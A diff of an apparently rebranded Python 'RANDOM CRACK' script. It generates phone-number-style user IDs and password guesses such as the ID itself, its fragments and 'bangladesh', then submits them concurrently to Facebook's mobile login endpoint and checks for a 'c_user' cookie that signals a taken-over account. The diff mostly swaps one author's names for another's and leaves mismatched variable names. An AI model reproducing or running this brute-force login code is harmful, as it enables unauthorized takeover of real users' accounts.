@@ -1,6 +1,6 @@
 #Script         
 #    Respotary   Star  
-#----------------------------------------------------------------------------------------------------------
+#---------------------------------------------------------------------------------------------------------
 #CREATE BY : MUMIT ISLAM HIMU
 #WHATSAPP : +8801644777805
 #GITHUB : https://github.com/MUMIT-404-CYBER
@@ -98,7 +98,8 @@ logo = ("""\033[1;37m
 ==================================================""")
 
 logo1 = ("""\033[1;37m
-     ____  _     _     ____     _ 
+    _____   ___   ______  _____________   ________
+    ____  _     _     ____     _ 
 /  _ \/ \   / \ /|/  _ \   / |
 | / \|| |   | |_||| / \|   | |
 | |-||| |_/\| | ||| |-||/\_| |
@@ -106,7 +107,7 @@ logo1 = ("""\033[1;37m
                               
 ==================================================""")
 
-def mumitx():
+def alhajx():
 	print('==================================================')
 
 def Main():
@@ -115,9 +116,9 @@ def Main():
         print(" [1] RANDOM CRACK")
         print(" [0] Exit")
         Mumit =input("\n [?] Choose : ")
-        if Mumit in ["1","01"]:
+        if Alhaj in ["1","01"]:
             fuck()
-        if Mumit in [" 0", "00"]:
+        if Alhaj in [" 0", "00"]:
             exit()
         else:
             exit()
@@ -148,7 +149,7 @@ def fuck():
         print('==================================================')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh,free fire'']
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
             yaari.submit(mumit2,uid,pwx,tl)
     print('==================================================')
     print(' [+] Crack process has been completed')
@@ -195,7 +196,7 @@ def alhaj2(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': LEGEND}
+            'user-agent': legend}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
